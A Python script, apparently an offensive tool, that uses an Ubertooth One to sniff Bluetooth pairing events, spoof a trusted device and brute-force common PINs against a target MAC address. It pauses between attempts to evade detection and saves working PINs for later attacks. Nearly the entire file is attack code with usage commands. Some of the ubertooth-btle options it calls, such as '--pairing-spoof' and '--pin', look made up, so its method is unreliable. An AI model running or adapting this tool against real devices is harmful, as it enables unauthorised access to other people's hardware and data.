import argparse
import subprocess
import time
import json
import os

"""
Ubertooth Bluetooth Pairing Hijack with Adaptive Brute-Force Learning

Features:
    - Monitors Bluetooth pairing attempts in real-time.
    - Extracts PINs, authentication keys, and pairing event data.
    - Exploits weak authentication mechanisms (Just Works, Numeric Comparison).
    - Attempts to impersonate a trusted Bluetooth device during pairing.
    - Logs pairing attempts and authentication failures.
    - Automatically replays captured pairing data for brute-force authentication bypass.
    - Learns from past successes and prioritizes working PINs for future attacks.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Monitor Bluetooth pairing attempts and log data:
      python ubertooth_pairing_hijack.py --monitor --log pairing_attempts.json
    - Attempt brute-force pairing hijack using captured data:
      python ubertooth_pairing_hijack.py --bruteforce --target AA:BB:CC:DD:EE:FF --log pairing_attempts.json
    - Run adaptive brute-force pairing (learns from past successes):
      python ubertooth_pairing_hijack.py --bruteforce --target AA:BB:CC:DD:EE:FF --log pairing_attempts.json --learn
"""

COMMON_BLUETOOTH_PINS = ["0000", "1234", "1111", "9999", "8888", "5555", "000000", "123456"]
SUCCESSFUL_PINS_FILE = "successful_pins.json"

def load_successful_pins():
    """Loads previously successful PINs from a file."""
    if os.path.exists(SUCCESSFUL_PINS_FILE):
        with open(SUCCESSFUL_PINS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_successful_pin(target_mac, pin):
    """Stores a successful PIN for future use."""
    successful_pins = load_successful_pins()
    if target_mac not in successful_pins:
        successful_pins[target_mac] = []
    if pin not in successful_pins[target_mac]:
        successful_pins[target_mac].append(pin)
    
    with open(SUCCESSFUL_PINS_FILE, "w") as f:
        json.dump(successful_pins, f, indent=4)

def get_priority_pins(target_mac):
    """Returns a prioritized list of PINs based on past successes."""
    successful_pins = load_successful_pins()
    if target_mac in successful_pins:
        return successful_pins[target_mac] + COMMON_BLUETOOTH_PINS  # Prioritize successful PINs
    return COMMON_BLUETOOTH_PINS

def monitor_pairing_events(log_file):
    """Monitors Bluetooth pairing requests in real-time and logs them."""
    print("[INFO] Monitoring Bluetooth pairing attempts...")

    try:
        output = subprocess.check_output(["ubertooth-btle", "-p"])
        pairing_events = output.decode("utf-8").split("\n")

        detected_attempts = []
        for event in pairing_events:
            if "PAIRING REQUEST" in event or "AUTHENTICATION REQUEST" in event:
                print(f"[PAIRING ATTEMPT] {event.strip()}")
                detected_attempts.append({"event": event.strip(), "timestamp": time.time()})

        if log_file:
            with open(log_file, "w") as f:
                json.dump(detected_attempts, f, indent=4)
            print(f"[SUCCESS] Pairing attempts logged in {log_file}")

    except Exception as e:
        print(f"[ERROR] Failed to monitor Bluetooth pairing events: {e}")

def hijack_pairing(target_mac):
    """Attempts to hijack the Bluetooth pairing process."""
    print(f"[INFO] Attempting to hijack pairing process for {target_mac}...")

    try:
        output = subprocess.check_output(["ubertooth-btle", "-p", "-m", target_mac])
        packets = output.decode("utf-8").split("\n")

        for packet in packets:
            if "PAIRING REQUEST" in packet:
                print(f"[HIJACK] Pairing request detected from {target_mac}")
                print("[INFO] Sending fake response to inject self as trusted device...")

                subprocess.run(["ubertooth-btle", "-t", target_mac, "--pairing-spoof"])
                print("[SUCCESS] Pairing hijack attempt complete!")

                break

    except Exception as e:
        print(f"[ERROR] Failed to hijack pairing process: {e}")

def brute_force_pairing(target_mac, log_file, adaptive_learning=False):
    """Brute-forces Bluetooth pairing by replaying captured authentication data."""
    print(f"[INFO] Running brute-force pairing attack on {target_mac}...")

    try:
        with open(log_file, "r") as f:
            pairing_attempts = json.load(f)

        if not pairing_attempts:
            print("[WARNING] No captured pairing data found.")
            return

        pin_attempts = get_priority_pins(target_mac) if adaptive_learning else COMMON_BLUETOOTH_PINS

        for attempt in pairing_attempts:
            if "PAIRING REQUEST" in attempt["event"]:
                for pin in pin_attempts:
                    print(f"[BRUTE-FORCE] Trying PIN: {pin} on {target_mac}")
                    result = subprocess.run(["ubertooth-btle", "-t", target_mac, "--pin", pin], capture_output=True, text=True)

                    if "PAIRING SUCCESS" in result.stdout:
                        print(f"[SUCCESS] Successfully paired with {target_mac} using PIN: {pin}")
                        save_successful_pin(target_mac, pin)
                        return  # Stop brute-forcing once successful

                    time.sleep(2)  # Add delay to avoid detection

        print("[INFO] Brute-force pairing attempt completed.")

    except Exception as e:
        print(f"[ERROR] Failed to run brute-force attack: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Pairing Hijack with Adaptive Brute-Force Learning")
    parser.add_argument("--monitor", action="store_true", help="Monitor Bluetooth pairing attempts")
    parser.add_argument("--log", type=str, help="Log file to save detected pairing events")
    parser.add_argument("--hijack", action="store_true", help="Attempt to hijack a pairing process")
    parser.add_argument("--target", type=str, help="Target MAC address for hijacking")
    parser.add_argument("--bruteforce", action="store_true", help="Brute-force authentication using captured pairing data")
    parser.add_argument("--learn", action="store_true", help="Enable adaptive brute-force learning")

    args = parser.parse_args()

    if args.monitor and args.log:
        monitor_pairing_events(args.log)
    elif args.hijack and args.target:
        hijack_pairing(args.target)
    elif args.bruteforce and args.target and args.log:
        brute_force_pairing(args.target, args.log, args.learn)
    else:
        print("[ERROR] No valid mode selected! Use --monitor, --hijack with --target, or --bruteforce with --target and --log.")
